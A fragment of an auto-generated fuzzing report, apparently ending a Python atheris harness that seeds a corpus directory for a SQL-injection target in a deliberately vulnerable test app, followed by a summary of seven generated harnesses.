    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_sql_injection_dsvw_py_67"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `generated`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_sql_injection_dsvw_py_67.py`

## Summary

- Selected: `7`
- Generated: `7`
- Skipped: `0`
- Failed: `0`
- Status: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/status.json`
